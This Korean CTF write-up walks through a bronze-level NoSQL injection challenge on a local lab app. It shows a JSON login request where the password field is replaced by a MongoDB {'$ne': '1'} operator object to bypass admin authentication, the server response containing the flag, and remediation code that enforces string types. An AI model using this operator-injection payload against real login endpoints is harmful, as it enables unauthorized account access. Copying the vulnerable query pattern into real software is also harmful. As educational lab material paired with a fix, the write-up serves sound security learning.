+++
title = "VulnABLE CTF [LUXORA] Write-up: NoSQL Injection 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "NoSQL Injection", "Bronze", "Auth Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: NoSQL Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (NoSQLi)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/nosqli/bronze`
- **목표**: MongoDB 등 NoSQL 데이터베이스의 특수 연산자를 악용하여, 비밀번호를 모르는 상태에서 관리자 계정으로 로그인을 우회하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/nosqli/bronze` 경로는 관리자 로그인을 위한 폼입니다. 
로그인 폼에서 이메일(`email`)과 비밀번호(`password`)를 입력하여 POST 요청을 보냅니다.

웹 브라우저의 개발자 도구(Network 탭)나 Burp Suite를 통해 패킷을 확인해보면, 요청이 폼 데이터(x-www-form-urlencoded)가 아닌 **JSON 포맷**으로 서버에 전송되고 있음을 알 수 있습니다.

**[정상 로그인 요청 패킷]**
```http
POST /nosqli/bronze HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "admin@luxora.test",
  "password": "password123"
}
```

**[해커의 사고 과정]**
1. 요청이 JSON으로 전송되고 있다. 
2. 백엔드는 Node.js(Express)와 MongoDB 조합일 확률이 높다. Express의 `body-parser` 모듈은 JSON을 파싱하여 자바스크립트 '객체(Object)'로 만들어버린다.
3. MongoDB 쿼리에서는 `{ $ne: "1" }` 과 같은 JSON 객체 형태의 연산자(Operator)를 사용한다.
4. 만약 백엔드에서 내가 보낸 JSON의 특정 필드가 '문자열'인지 검사하지 않고 쿼리에 통째로 넘겨버린다면?

---

## 💥 2. 취약점 식별 및 페이로드 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --({"username":{"$ne":null}, "password":{"$ne":null}})--> [ NoSQL DB ]
                                                                       |-- Condition is True
                                                                       |-- Returns Admin Record
```


목표는 `admin@luxora.test` 계정으로 로그인하는 것이지만, 우리는 비밀번호를 모릅니다.
따라서 비밀번호 필드에 단순한 문자열이 아닌 **NoSQL 연산자 객체**를 주입해보겠습니다.

### 💡 활용할 NoSQL 연산자
* `$ne` (Not Equal): 지정한 값과 같지 않은 것을 찾음.
* `$gt` (Greater Than): 지정한 값보다 큰 것을 찾음.

우리는 비밀번호 란에 문자열 대신 `{"$ne": "1"}` 이라는 객체를 넣어보겠습니다. 이는 "비밀번호가 1이 아닌 계정을 찾아라"라는 의미가 됩니다. 관리자의 진짜 비밀번호가 1일 확률은 거의 없으므로, 이 조건은 무조건 참(True)이 됩니다.

### 공격 페이로드 작성
Burp Suite의 Repeater로 가져와서 JSON 본문을 조작합니다.

```json
{
  "email": "admin@luxora.test",
  "password": {"$ne": "1"}
}
```

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 JSON 데이터를 서버로 전송합니다.

```http
POST /nosqli/bronze HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "admin@luxora.test",
  "password": {"$ne": "1"}
}
```

### 서버 내부의 동작 (추정)
백엔드 로직은 대략 아래와 같이 작성되어 있을 것입니다.
```javascript
// req.body.password가 객체로 파싱되어 그대로 들어감
db.collection('users').findOne({ 
    email: "admin@luxora.test", 
    password: { $ne: "1" } 
});
```
이 쿼리는 `admin@luxora.test` 이메일을 가지고 있으면서 비밀번호가 `"1"`이 아닌 레코드를 반환하므로, 정상적으로 인증이 통과됩니다.

### 서버의 응답 (결과)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "Welcome back, admin!",
  "flag": "FLAG{NOSQL_🥉_AUTH_BYPASS_F1A2B3}"
}
```

서버는 이 요청을 정상적인 관리자 로그인으로 판단하고 플래그를 반환했습니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

JSON 파싱의 특성과 NoSQL의 연산자 문법을 절묘하게 결합하여(Object Injection), 비밀번호 검증 로직을 수학적으로 무력화시켰습니다.

**🔥 획득한 플래그:**
`FLAG{NOSQL_🥉_AUTH_BYPASS_F1A2B3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
NoSQL Injection의 가장 흔한 원인은 클라이언트가 보낸 데이터의 '타입(Type)'을 서버가 명시적으로 검증하지 않는 데 있습니다.

* **취약한 코드**
```javascript
// 입력값이 문자열인지 객체인지 확인하지 않고 그대로 쿼리에 삽입
const user = await User.findOne({ email: req.body.email, password: req.body.password });
```

* **안전한 패치 코드 (Type Casting 및 강제 변환)**
```javascript
// 비밀번호가 반드시 '문자열(String)' 타입이어야만 진행되도록 방어 로직 추가
if (typeof req.body.password !== 'string') {
    return res.status(400).send("Invalid input type");
}
// 또는 명시적으로 문자열로 캐스팅
const password = String(req.body.password);
const user = await User.findOne({ email: req.body.email, password: password });
```
입력값을 명시적으로 문자열로 바꿔버리면, 해커가 `{"$ne": "1"}`을 보내더라도 몽고DB는 이를 연산자가 아닌 `[object Object]`라는 단순 문자열 데이터로 취급하므로 공격이 성립하지 않습니다.